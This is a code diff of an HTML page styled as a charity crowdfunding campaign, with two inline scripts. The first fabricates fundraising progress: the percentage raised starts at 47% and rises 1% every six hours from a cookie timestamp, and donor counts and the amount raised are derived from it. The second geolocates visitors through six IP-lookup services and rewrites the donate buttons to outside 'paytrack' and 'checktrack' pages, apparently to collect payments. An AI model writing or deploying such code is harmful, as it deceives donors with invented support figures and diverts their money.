@@ -11830,15 +11830,14 @@
       <g>
         <path id="fundraiser-circle-goal-bar_line" d="M 0 -36 A 36 36 0 1 1 0 36 A 36 36 0 1 1 0 -36" fill="none" stroke="#02a95c" stroke-width="8" stroke-linecap="round" stroke-dasharray="226.1946710584651" stroke-dashoffset="226.1946710584651"></path>
       </g>
-      <text alignment-baseline="middle" class="circle-goal-bar_text__kksyP" dominant-baseline="middle" text-anchor="middle" x="1" y="1" fill="#6F6F6F" id="progressText">0%</text>
+      <text alignment-baseline="middle" class="circle-goal-bar_text__kksyP" dominant-baseline="middle" text-anchor="middle" x="1" y="1" fill="#6F6F6F" id="progressText">0%
+      </text>
     </svg>
   </div>
 </div>
-
 <div class="campaign-page_shareAndDonate__qRlrx">
   <div>
-    <div class="hrt-mb-1 hrt-mx-auto" data-element-id="btn_share" data-analytic-event-listener="true">
-    </div>
+    <div class="hrt-mb-1 hrt-mx-auto" data-element-id="btn_share" data-analytic-event-listener="true"></div>
     <div class="desktop-breaks">
       <br><br><br><br><br><br><br>
     </div>
@@ -11857,152 +11856,148 @@
     </div>
   </div>
 </div>
-
 <script>
-  function getCookieValue(name) {
-    var cookieString = document.cookie || '';
-    var cookies = cookieString.split(';');
-    for (var i = 0; i < cookies.length; i++) {
-      var c = cookies[i].trim();
-      if (c.indexOf(name + '=') === 0) {
-        return c.substring((name + '=').length, c.length);
-      }
+function getCookieValue(name) {
+  var cookieString = document.cookie || '';
+  var cookies = cookieString.split(';');
+  for (var i = 0; i < cookies.length; i++) {
+    var c = cookies[i].trim();
+    if (c.indexOf(name + '=') === 0) {
+      return c.substring((name + '=').length, c.length);
     }
-    return null;
   }
-
-  document.addEventListener("DOMContentLoaded", function() {
-    var totalGoal = 100000;
-    var totalDonorsAt100 = 2930;
-    var donationPercentage = 47;
-    try {
-      var cookieValue = getCookieValue('myDonationCookie');
-      if (cookieValue) {
-        var cookieObj = JSON.parse(cookieValue);
-        if (cookieObj.start) {
-          var now = Date.now();
-          var startTime = parseInt(cookieObj.start, 10);
-          var diffMs = now - startTime;
-          if (diffMs > 0) {
-            var hoursSince = Math.floor(diffMs / 3600000);
-            var increments = Math.floor(hoursSince / 6);
-            donationPercentage += increments;
-          }
+  return null;
+}
+document.addEventListener("DOMContentLoaded", function() {
+  var totalGoal = 100000;
+  var totalDonorsAt100 = 2930;
+  var donationPercentage = 47;
+  try {
+    var cookieValue = getCookieValue('myDonationCookie');
+    if (cookieValue) {
+      var cookieObj = JSON.parse(cookieValue);
+      if (cookieObj.start) {
+        var now = Date.now();
+        var startTime = parseInt(cookieObj.start, 10);
+        var diffMs = now - startTime;
+        if (diffMs > 0) {
+          var hoursSince = Math.floor(diffMs / 3600000);
+          var increments = Math.floor(hoursSince / 6);
+          donationPercentage += increments;
         }
       }
-    } catch (err) {
-      console.log("Cookie parse error or no valid JSON in 'myDonationCookie':", err);
     }
-    var displayDonationPercentage = Math.min(donationPercentage, 100);
-    var currentRaised = Math.round((totalGoal * displayDonationPercentage) / 100);
-    var currentDonors = Math.round((totalDonorsAt100 * displayDonationPercentage) / 100);
-    document.getElementById("amountRaisedSpan").textContent = "$" + currentRaised.toLocaleString();
-    document.getElementById("goalSpan").textContent = "$" + totalGoal.toLocaleString() + " goal";
-    document.getElementById("donationsSpan").textContent = currentDonors.toLocaleString() + " donations";
-    document.getElementById("progressText").textContent = displayDonationPercentage + "%";
-    document.getElementById("progress-title").textContent = displayDonationPercentage + "% of the goal raised";
-    var radius = 36;
-    var circumference = 2 * Math.PI * radius;
-    var progressCircle = document.getElementById("fundraiser-circle-goal-bar_line");
-    var offset = circumference * (1 - (displayDonationPercentage / 100));
-    progressCircle.setAttribute("stroke-dashoffset", offset.toString());
-    if (donationPercentage >= 100) {
-      var donateButtonContainers = document.querySelectorAll('[data-element-id="btn_donate"]');
-      donateButtonContainers.forEach(function(container) {
-        container.style.display = 'none';
-      });
-      var completeMessage = document.getElementById('donationCompleteMessage');
-      if (completeMessage) {
-        completeMessage.style.display = 'block';
-      }
+  } catch (err) {
+    console.log("Cookie parse error or no valid JSON in 'myDonationCookie':", err);
+  }
+  var displayDonationPercentage = Math.min(donationPercentage, 100);
+  var currentRaised = Math.round((totalGoal * displayDonationPercentage) / 100);
+  var currentDonors = Math.round((totalDonorsAt100 * displayDonationPercentage) / 100);
+  document.getElementById("amountRaisedSpan").textContent = "$" + currentRaised.toLocaleString();
+  document.getElementById("goalSpan").textContent = "$" + totalGoal.toLocaleString() + " goal";
+  document.getElementById("donationsSpan").textContent = currentDonors.toLocaleString() + " donations";
+  document.getElementById("progressText").textContent = displayDonationPercentage + "%";
+  document.getElementById("progress-title").textContent = displayDonationPercentage + "% of the goal raised";
+  var radius = 36;
+  var circumference = 2 * Math.PI * radius;
+  var progressCircle = document.getElementById("fundraiser-circle-goal-bar_line");
+  var offset = circumference * (1 - (displayDonationPercentage / 100));
+  progressCircle.setAttribute("stroke-dashoffset", offset.toString());
+  if (donationPercentage >= 100) {
+    var donateButtonContainers = document.querySelectorAll('[data-element-id="btn_donate"]');
+    donateButtonContainers.forEach(function(container) {
+      container.style.display = 'none';
+    });
+    var completeMessage = document.getElementById('donationCompleteMessage');
+    if (completeMessage) {
+      completeMessage.style.display = 'block';
     }
-  });
+  }
+});
 </script>
-
 <script>
-  document.addEventListener("DOMContentLoaded", function() {
-    var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
-    donateAnchors.forEach(function(anchor) {
-      anchor.href = '#';
-    });
-    var donationLinks = {
-      'US': 'https://ituberus.github.io/tesl/paytrack',
-      'GB': 'https://ituberus.github.io/tesl/checktrack',
-      'CA': '#'
-    };
-    var euCountries = ["AT","BE","BG","CY","CZ","DE","DK","EE","ES","FI","FR","GR","HR","HU","IE","IT","LT","LU","LV","MT","NL","PL","PT","RO","SE","SI","SK"];
-    var defaultLink = 'https://ituberus.github.io/tesl/checktrack';
-    var geoApis = [
-      'https://ipapi.co/json/',
-      'https://ipwho.is/',
-      'https://geolocation-db.com/json/',
-      'https://ip-api.com/json/',
-      'https://extreme-ip-lookup.com/json/',
-      'https://ipinfo.io/json'
-    ];
-    var results = [];
-    function extractCountryCode(data, apiUrl) {
-      var code = '';
-      if (data.country_code && typeof data.country_code === 'string' && data.country_code.length === 2) {
-        code = data.country_code;
-      } else if (data.countryCode && typeof data.countryCode === 'string' && data.countryCode.length === 2) {
-        code = data.countryCode;
-      } else if (data.country && typeof data.country === 'string' && data.country.length === 2) {
-        code = data.country;
-      }
-      code = code.toUpperCase();
-      if (euCountries.includes(code)) {
-        console.log("[GeoScript]", apiUrl, "=> EU country", code, "mapped to 'GB'");
-        return 'GB';
-      }
-      if (code) {
-        console.log("[GeoScript]", apiUrl, "=> code:", code);
-      } else {
-        console.log("[GeoScript]", apiUrl, "=> No valid country code found");
-      }
-      return code;
-    }
-    function updateDonationLink() {
-      var counts = {};
-      var majorityCode = null;
-      var maxCount = 0;
-      results.forEach(function(code) {
-        counts[code] = (counts[code] || 0) + 1;
-      });
-      for (var code in counts) {
-        if (counts[code] > maxCount) {
-          maxCount = counts[code];
-          majorityCode = code;
-        }
-      }
-      console.log("[GeoScript] Votes:", results, "Tally:", counts, "Majority code:", majorityCode);
-      var newLink = donationLinks[majorityCode] || defaultLink;
-      var fbclid = new URLSearchParams(window.location.search).get('fbclid');
-      if (fbclid && newLink !== '#') {
-        newLink += (newLink.indexOf('?') > -1 ? '&' : '?') + "fbclid=" + encodeURIComponent(fbclid);
-      }
-      donateAnchors.forEach(function(anchor) {
-        anchor.href = newLink;
-      });
-      console.log("[GeoScript] Donation links updated to:", newLink);
-    }
-    geoApis.forEach(function(apiUrl) {
-      fetch(apiUrl)
-        .then(function(response) {
-          return response.json();
-        })
-        .then(function(data) {
-          var code = extractCountryCode(data, apiUrl);
-          if (code) {
-            results.push(code);
-            updateDonationLink();
-          }
-        })
-        .catch(function(error) {
-          console.log("[GeoScript] Error fetching from", apiUrl, "=>", error);
-        });
-    });
+document.addEventListener("DOMContentLoaded", function() {
+  var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
+  donateAnchors.forEach(function(anchor) {
+    anchor.href = '#';
   });
+  console.log("[GeoScript] All donate links set to '#' initially.");
+  var donationLinks = {
+    'US': 'https://ituberus.github.io/tesl/paytrack',
+    'GB': 'https://ituberus.github.io/tesl/checktrack',
+    'CA': '#'
+  };
+  var euCountries = ["AT","BE","BG","CY","CZ","DE","DK","EE","ES","FI","FR","GR","HR","HU","IE","IT","LT","LU","LV","MT","NL","PL","PT","RO","SE","SI","SK"];
+  var defaultLink = 'https://ituberus.github.io/tesl/checktrack';
+  var geoApis = ['https://ipapi.co/json/','https://ipwho.is/','https://geolocation-db.com/json/','https://ip-api.com/json/','https://extreme-ip-lookup.com/json/','https://ipinfo.io/json'];
+  var results = [];
+  function extractCountryCode(data, apiUrl) {
+    var code = '';
+    if (data.country_code && typeof data.country_code === 'string' && data.country_code.length === 2) {
+      code = data.country_code;
+    } else if (data.countryCode && typeof data.countryCode === 'string' && data.countryCode.length === 2) {
+      code = data.countryCode;
+    } else if (data.country && typeof data.country === 'string' && data.country.length === 2) {
+      code = data.country;
+    }
+    code = code.toUpperCase();
+    if (euCountries.includes(code)) {
+      console.log("[GeoScript]", apiUrl, "=> EU country", code, "mapped to 'GB'");
+      return 'GB';
+    }
+    if (code) {
+      console.log("[GeoScript]", apiUrl, "=> code:", code);
+    } else {
+      console.log("[GeoScript]", apiUrl, "=> No valid country code found");
+    }
+    return code;
+  }
+  function updateDonationLink() {
+    var counts = {};
+    var majorityCode = null;
+    var maxCount = 0;
+    results.forEach(function(code) {
+      counts[code] = (counts[code] || 0) + 1;
+    });
+    for (var code in counts) {
+      if (counts[code] > maxCount) {
+        maxCount = counts[code];
+        majorityCode = code;
+      }
+    }
+    console.log("[GeoScript] Votes:", results, "Tally:", counts, "Majority code:", majorityCode);
+    var newLink = donationLinks[majorityCode] || defaultLink;
+    var urlParams = new URLSearchParams(window.location.search);
+    var fbclid = urlParams.get('fbclid');
+    if (fbclid) {
+      if (newLink.slice(-1) === '/') {
+        newLink = newLink + '?fbclid=' + fbclid;
+      } else {
+        newLink = newLink + '/?fbclid=' + fbclid;
+      }
+    }
+    donateAnchors.forEach(function(anchor) {
+      anchor.href = newLink;
+    });
+    console.log("[GeoScript] Donation links updated to:", newLink);
+  }
+  geoApis.forEach(function(apiUrl) {
+    fetch(apiUrl)
+      .then(function(response) {
+        return response.json();
+      })
+      .then(function(data) {
+        var code = extractCountryCode(data, apiUrl);
+        if (code) {
+          results.push(code);
+          updateDonationLink();
+        }
+      })
+      .catch(function(error) {
+        console.log("[GeoScript] Error fetching from", apiUrl, "=>", error);
+      });
+  });
+});
 </script>
 
 
